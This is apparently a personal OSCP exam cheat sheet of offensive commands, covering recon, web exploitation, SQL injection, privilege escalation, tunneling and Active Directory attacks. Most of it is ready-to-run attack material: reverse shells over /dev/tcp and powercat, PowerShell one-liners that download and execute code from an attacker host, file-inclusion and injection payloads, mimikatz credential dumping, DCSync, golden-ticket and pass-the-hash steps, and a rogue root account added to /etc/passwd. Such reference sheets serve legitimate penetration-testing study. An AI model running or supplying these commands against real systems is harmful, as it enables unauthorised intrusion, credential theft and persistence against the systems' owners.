# OSCP Cheat Sheet (8fud's Edition)

A field reference built from hands-on labs and personal habit.

---

## Recon & OSINT

### Whois
```
whois offensive-security.com -h <custom-whois-server>
```

### Google Dorking
- site:<domain> filetype:pdf | filetype:doc | filetype:xls
- site:<domain> inurl:admin | inurl:login | intext:"password"
- site:github.com <domain> AND ("password" OR "api_key" OR "AWS_ACCESS_KEY_ID" OR "PRIVATE_KEY" OR "SECRET_KEY")
- site:pastebin.com <domain>
- [ExploitDB Google Hacking DB](https://www.exploit-db.com/google-hacking-database)

### Metadata Extraction
```
exiftool -a -u file.pdf
```

---

## Web Recon & Enumeration

### Wappalyzer, WhatWeb
```
whatweb <url>
```

### Sitemap & Robots
Check directly: `/sitemap.xml` and `/robots.txt`

### Fuzzing
```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://host/FUZZ
ffuf -u "http://host/FUZZ.EXT" -w wordlist:EXT
ffuf -c -X POST -w passwd.txt -u http://host/login.php -d "username=admin&password=FUZZ"
```

### Browser Tools
- Dev tools: Network, debugger, prettify JS, modify/request headers.

---

## DNS Enumeration

```
host -t mx target.com
host -t txt target.com
dnsrecon -d target.com -t std
dnsenum target.com
nslookup -type=TXT info.target.com <dns-server>
```

---

## Scanning & Enumeration

### Nmap (favorite recipes)
```
sudo nmap -Pn -sCV -p- <IP> -vvv --min-rate 8888                      # All ports, scripts, verbose, fast
sudo nmap -Pn -sS -p- <IP> -vvv --min-rate 8888                       # Full TCP SYN scan, all ports
sudo nmap -Pn -sCV -p 445,139,3389,5985,5986 <IP> -vvv                # Windows RDP/SMB/WinRM focus
sudo nmap -A --top-ports=20 <IP>                                      # OS detect, scripts, traceroute
nmap --script-updatedb
nmap -oG sweep.txt                                                    # Grepable output
```

### Rustscan (alternative)
```
rustscan -a <IP> | sudo nmap -iL - -A -sV
```

### Netcat
```
nc -nvv -w 1 -z <IP> <port-start>-<port-end>
nc -nv -u -z -w 1 <IP> 120-123            # UDP scan
```

### Windows Port Quick Check
```
test-netconnection -port 445 <IP>           # PowerShell
```

---

## Shares / SMB / NetBIOS

### Net View (Windows)
```
net view \\host /all
```

### netexec Examples (SMB, RDP, WinRM)
```
netexec smb <IP> -u users.txt -p passwords.txt --continue-on-success
netexec smb <IP> -u user -p 'password' --shares             # List shares
netexec rdp <IP> -u user -p 'Password!' --continue-on-success
netexec winrm <IP> -u admin -p 'Password!' --continue-on-success
netexec smb <IP range> -u user -p pass --shares
```

---

## Email/SMTP Enumeration

```
nc -nv <ip> 25
telnet <ip> 25
# python VRFY tool:
python vrfy.py root <IP>
```
#### swaks (send test mails, phishing, w/ or w/o authentication)
```
swaks --to user@domain.com --from sender@domain.com --server <IP> \
  --header "Subject: Test" --body @body.txt --attach @file.txt --auth LOGIN \
  --auth-user myuser --auth-password 'mypass'
```

---

## SNMP
```
sudo nmap -sU --open -p 161 <IP-range> -vvv -oG open-snmp.txt
onesixtyone -c community -i ips
snmpwalk -c public -v1 -t 10 <IP>
snmpwalk -c public -v1 -t 10 <IP> <OID>
```

---

## Misc Enumeration

### Browser/HTTP/curl tricks
```
curl -i http://target
curl -i http://target/api -d '{"key":"value"}' -H "Content-Type: application/json"
curl -X PUT -i http://host/api -d '{"password":"pwn3d"}' -H 'Authorization: OAuth <jwt>'
curl --path-as-is http://host/path/../../../../..
curl -i http://target --user-agent "<script>eval(String.fromCharCode(...))</script>" --proxy 127.0.0.1:8080
```

---

## Exploitation & Attack Techniques

### Path Traversal / LFI / RFI
- Linux: `/etc/passwd`, `.ssh/id_rsa`
- Windows: `windows/system32/drivers/etc/hosts`
- Grafana: `.../public/plugins/alertlist/../../users/install.txt`
- PHP wrappers:
    - `php://filter/convert.base64-encode/resource=admin.php`
    - `data://text/plain,<?php system('COMMAND'); ?>`
- RFI: `?page=http://attacker/rev.php&cmd=ls`

### File Upload Attacks
- Try extensions: php, phtml, php7, pHp
- Overwrite with traversal: filename set to `../../../../root/.ssh/authorized_keys`

### Command Injection

**Linux:**
- Separators: `;`, `&&`, `` ` ``, double-encoding
- Reverse shell:  
  ```bash
  curl ... --data 'param=`bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"`'
  ```

**Windows:**
- xp_cmdshell examples (MSSQL):
  ```sql
  exec sp_configure 'show advanced options', 1; reconfigure;
  exec sp_configure 'xp_cmdshell', 1; reconfigure;
  exec xp_cmdshell 'whoami'
  ```
- URL-encoded one-liner via curl:
  ```
  curl -X POST http://target/archive --data 'Archive=git%3Biex(new-object net.webclient).downloadstring("http://attacker/powercat.ps1"); powercat -c attackerip -p 8888 -e powershell'
  ```
- PowerShell download & exec:
  ```
  iex(iwr http://attacker/rev.ps1 -useb)
  # Or
  powershell -nop -w hidden -e <base64>
  ```

---

## SQLi

### Error/Union Based
```
' or 1=1--
' union select 1,2,3,4,@@version,6-- -
' order by <N>-- -          # Find column count
' union select 1,2,load_file('/etc/passwd'),4,5-- -
```

### sqlmap (fav combos)
```
sqlmap -u http://target/page.php?id=1 -p id
sqlmap -r post.txt --os-shell --web-root "/var/www/html"
```

### MSSQL Command Exec
```
exec sp_configure ‘show advanced options’, 1; reconfigure;
exec sp_configure ‘xp_cmdshell’, 1; reconfigure;
exec xp_cmdshell ‘whoami’;
```

---

## Hash & Password Attacks

### Cracking (hashcat, john)
```
hashcat -m <type> hash.txt /usr/share/wordlists/rockyou.txt
john --wordlist=rockyou.txt hash.txt
# bcrypt, NTLM (-m 1000), WPA, KeePass (-m 13400), phpass (-m 400), ASREP (-m 18200), Kerberos (-m 13100)
```
### Mutating Wordlists
```
head rockyou.txt > demo.txt
sed -i '/^1/d' demo.txt
hashcat -r rulefile.rule --stdout demo.txt
```

---

## Hash/Secrets Exfil & Usage

### impacket (personal top picks)
```
impacket-psexec 'administrator@target' -hashes :NTLMHASH  ## Windows shell w/ pass-the-hash
impacket-secretsdump -just-dc-user user 'domain/admin:Password@dc-ip'
impacket-secretsdump 'domain/user:Password@ip'                 ## Dump secrets locally/remotely, w/ vss, just-dc
impacket-wmiexec -hashes :NTLMHASH Administrator@192.168.X.X   ## WMI shell via hash
impacket-smbserver share . -username kali -password kali -smb2support
impacket-GetUserSPNs -dc-ip <dc-ip> 'domain/user:pass' -request  ## Kerberoasting
impacket-GetNPUsers -dc-ip <dc-ip> -usersfile users.txt         ## AS-REP roasting, no passwords req'd
```

---

## Privilege Escalation (Windows)

### Enumerate
```
whoami /groups
systeminfo
icacls
get-process
Get-ItemProperty "HKLM:\SOFTWARE\..."
get-ciminstance win32_service | select Name,State,PathName | where {$_.State -like 'Running'}
schtasks /query /fo LIST /v | findstr <user>
```

### Service Binary/DLL Hijack
- Replace service binary/DLL (after icacls check), restart service, escalate

### Unquoted Service Paths
- Identify via WMI/PowerShell, inject/exploit C:\Program.exe, Current.exe, etc.

### Scheduled Tasks
- Abuse writable tasks/scripts for code execution (cron in Linux)

### Mimikatz (dump creds, hash, tickets)
```
.\mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "sekurlsa::tickets /export" "exit"
.\mimikatz.exe "kerberos::ptt <ticket>.kirbi"    # Pass-the-ticket
.\mimikatz.exe "lsadump::dcsync /user:domain\user"
```
- Use PowerShell script to inject mimikatz if AV evasion is needed

---

## Privilege Escalation (Linux)

```
id
sudo -l
find / -perm -4000 -ls -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/passwd   # Look for writable or default root entries
crontab -l
cat /etc/cron* /etc/cron.hourly/*
# LinPEAS/unix-privesc-check for auto-enum
```
- Exploit SUID/SGID binaries (see GTFOBins)
- Abusing /etc/passwd if world-writeable: add root2:hash:0:0::/root:/bin/bash and su in.

---

## Port Forwarding & Tunneling

### ligolo-ng ★ 8fud's MUST-HAVE!
- Deploy agent on target, SOCKS & tunnel magic:
```
# On attacker:
ligolo-ng relay -listen 0.0.0.0:443 -self-cert
ligolo-ng proxy -relay 127.0.0.1:443 -ui

# On target:
ligolo-ng agent -connect ATTACKER_IP:443
```
- Use the web UI or CLI to start SOCKS tunnel. Use nmap, proxychains, MSSQL/WinRM/RDP/web...

### socat
```
socat TCP-LISTEN:<localport>,fork TCP:<targetIP>:<targetPort>
```
### SSH
```
ssh -N -L 0.0.0.0:<LPORT>:<TARGET_IP>:<TGT_PORT> user@jumpbox
ssh -N -D 0.0.0.0:1080 user@host
ssh -N -R 127.0.0.1:<lport>:<target>:<rport> kali@yourhost
```
### Chisel, dnscat2
- Chisel: `chisel server --port 8008 --reverse`
- dnscat2-server / dnscat2-client for DNS tunneling in egress-restricted setups.

---

## Active Directory Attacks & Lateral Movement

### Net & PowerShell Commands
```
net user /domain
net group "domain admins" /domain
net user <username> /domain
```
### Kerberos Attacks
- **Kerberoasting:** GetUserSPNs, crack TGS tickets, escalate (hashcat -m 13100).
- **AS-REP Roasting:** GetNPUsers, crack hash (hashcat -m 18200).
- **Pass-the-Ticket:** Mimikatz `kerberos::ptt <ticket>`, use token to access other resources.
- **Golden Ticket:** Dump krbtgt hash, forge TGT with mimikatz `kerberos::golden ... /ptt`.
- **Overpass-the-Hash:** `sekurlsa::pth /user: /domain: /ntlm: /run:cmd.exe`
- **DCSync Attack:** `lsadump::dcsync /user:corp\dave` (mimikatz) or impacket-secretsdump.

### Hash & Ticket Usage for Movement
- `impacket-psexec`, `wmiexec`, `smbexec` with pass-the-hash
- `impacket-secretsdump -just-dc-user krbtgt ...` for krbtgt hash (Golden Ticket ops)
- Use exported TGS/Kirbi tickets with mimikatz

### Persistence
- Save/export golden ticket, schedule tasks, or abuse startup scripts.
- Shadow copy exfil: use vshadow.exe, copy ntds.dit & SYSTEM hive, parse with secretsdump.

### Bloodhound & SharpHound
- `Invoke-BloodHound -CollectionMethod All -OutputDirectory ...`
- Analyze with Bloodhound GUI/Neo4j

### General AD Enumeration
- PowerView/SharpHound scripts (get-netuser, get-netcomputer, get-objectacl, find-localadminaccess, find-domainshare)

---

## Metasploit & Automation

```
msfconsole
db_nmap -Pn -A <IP> -vvv
hosts
services
creds
vulns
use auxiliary/scanner/...
use exploit/...
set RHOSTS ...
set LHOST ...
set PAYLOAD ...
run -j
sessions -i <id>
# Handler for manual shell/rev shell: use exploit/multi/handler
```

Use resource scripts (`msfconsole -r listener.rc`) to automate repeated setups.

---

## Pro Tips / Philosophy

- **Enumerate ruthlessly:** New cred → repeat enum across AD, shares, RDP, web, etc.
- **Borrow, break, restore:** Clean up after binary/service privescs on exam labs.
- **Automate:** LinPEAS, WinPEAS, SharpHound, scripts.
- **Think:** Don’t tunnel vision. Rerun Bloodhound/enum with new creds for “hidden” paths.
- **Pivoting & tunneling:** Use ligolo-ng, chisel, dnscat2, ssh, socat, netexec for tough network layouts.
- **Central references:** GTFOBins, PayloadsAllTheThings, HackTricks, your own notes!
